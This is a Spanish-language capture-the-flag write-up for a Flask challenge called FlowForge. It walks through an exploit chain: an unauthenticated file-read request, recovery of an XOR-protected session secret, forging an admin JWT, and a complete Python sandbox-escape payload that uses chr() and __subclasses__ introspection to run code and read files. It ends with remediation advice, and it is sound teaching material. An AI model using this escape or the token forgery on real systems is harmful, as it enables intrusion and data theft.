# Write-up — Ni8mare Lite (FlowForge)

| | |
|---|---|
| **CTF** | FluidAttacks CTF 2026 |
| **Categoría** | API |
| **Dificultad** | Hard |
| **Puntos** | 355 |
| **Flag** | `flag{8a7b5a5537f4d022}` |
| **Vulnerabilidad** | Cadena: LFI sin auth → recuperación de secreto XOR → forja de JWT admin → escape de sandbox (`exec`) |

---

## 1. Enunciado

> FlowForge automates your workflows... A fresh instance just went up for internal use,
> source and all; the docs are at /api/docs. **The flag is somewhere on the server's
> filesystem.**

Se entrega el código (Flask + PyJWT). La flag está en `/flag_<8hex>.txt` (nombre
aleatorio, permisos 444). El servicio corre como el usuario `flowforge`.

El nombre "Ni8mare" es un guiño a **n8n** (automatización de workflows). El código marca
explícitamente varios endpoints como *red herrings* (`/workflows/debug`,
`/notifications/preview`, `/workflows/import`); el vulnerable de verdad es
`/api/workflows/evaluate`, que exige **JWT de admin**.

---

## 2. Eslabón 1 — LFI sin autenticación

`POST /api/webhooks/trigger` acepta un array `files` y lee cada `path` si termina en
`.json`/`.yml`/`.db`, devolviendo un preview. **No requiere autenticación.**

```json
POST /api/webhooks/trigger
{"workflow_id":"x","files":[{"path":"/app/.internal/config.json"}]}
```

`config.json` (creado en `init_app`) contiene el `SESSION_SECRET` cifrado:

```json
{"session_secret": "<XOR_ENCODED_SECRET hex>", "version": "2.1.0"}
```

---

## 3. Eslabón 2 — recuperar el SESSION_SECRET

El cifrado es reversible y la clave es adivinable:

```python
SESSION_SECRET = os.urandom(24).hex()                       # 48 chars
xor_key = sha256(str(BOOT_TIMESTAMP).encode()).digest()[:48] # 32 bytes
XOR_ENCODED_SECRET = xor(SESSION_SECRET.encode(), xor_key)
```

`BOOT_TIMESTAMP` se expone en claro en `GET /api/health` (`started_at`). Con él se
recomputa `xor_key` y se descifra el secreto:

```python
xor_key = sha256(str(started_at).encode()).digest()[:48]
SESSION_SECRET = xor(bytes.fromhex(enc_hex), xor_key).decode()
```

---

## 4. Eslabón 3 — forjar JWT de admin

El secreto HS256 ya es conocido, así que se firma un token con `role: admin`:

```python
jwt.encode({"user":"pwn","role":"admin"}, SESSION_SECRET, algorithm="HS256")
```

---

## 5. Eslabón 4 — escape del sandbox en `/api/workflows/evaluate`

El endpoint hace `exec(expression)` con `__builtins__` recortado (`SANDBOX_BUILTINS`,
sin `open`/`import`) y una **blacklist regex** de palabras (`os`, `subprocess`,
`__import__`, `import`, `open`, `eval`, `exec`, `compile`, `globals`, `locals`, ...).

Puntos débiles del sandbox:
- Deja `getattr`, `type`, `chr`, `isinstance`, `print` → suficientes para introspección.
- La blacklist opera sobre el **texto fuente**: los nombres prohibidos se pueden construir
  en runtime con `chr()`.
- `\bglobals\b` NO matchea dentro de `__globals__` (el `_` es carácter de palabra, no hay
  borde), así que `__init__.__globals__` es utilizable.

Escape (recuperar los builtins reales de otra clase y armar los nombres con `chr`):

```python
def S(*c): return ''.join(chr(x) for x in c)
bi=None
for k in ().__class__.__base__.__subclasses__():
    g=getattr(k.__init__,'__globals__',None)
    if isinstance(g,dict):
        b=g.get('__builtins__')
        if isinstance(b,dict) and S(111,112,101,110) in b:   # 'open'
            bi=b; break
m=bi[S(95,95,105,109,112,111,114,116,95,95)](S(111,115))     # __import__('os')
names=getattr(m,S(108,105,115,116,100,105,114))(S(47))        # os.listdir('/')
hit=[n for n in names if n.startswith(S(102,108,97,103))]     # 'flag'
op=bi[S(111,112,101,110)]                                     # open
print(op(S(47)+hit[0]).read())                                # read /flag_*.txt
```

Salida: `flag{8a7b5a5537f4d022}`. (Verificado el escape en local antes del remoto.)

---

## 6. Flag

```
flag{8a7b5a5537f4d022}
```

---

## 7. Causa raíz y remediación

- **LFI sin auth**: `/api/webhooks/trigger` abre rutas arbitrarias del usuario sin
  autenticación ni confinamiento a un directorio base. Confinar (realpath dentro de un
  root permitido), autenticar, y no exponer previews de archivos internos.
- **Secreto derivable**: cifrar el `SESSION_SECRET` con una clave derivada de un valor
  público (el timestamp de arranque) equivale a no cifrarlo. Los secretos no deben
  guardarse en disco recuperables; usar KMS/entorno con permisos estrictos.
- **`exec` como sandbox**: no existe sandbox seguro basado en `exec` + blacklist de
  cadenas; la introspección de `__subclasses__`/`__globals__` siempre reconstruye los
  builtins. Para evaluar expresiones de usuario, usar un intérprete restringido real
  (AST allow-list sin acceso a atributos dunder) o un proceso aislado sin capacidades.

**Lección de CTF:** encadenar bugs "menores" — un LFI que solo lee `.json`, un secreto
"cifrado", un JWT — culmina en RCE. Y todo sandbox de `exec` con blacklist de palabras
se rompe con `chr()` + `().__class__.__base__.__subclasses__()`.
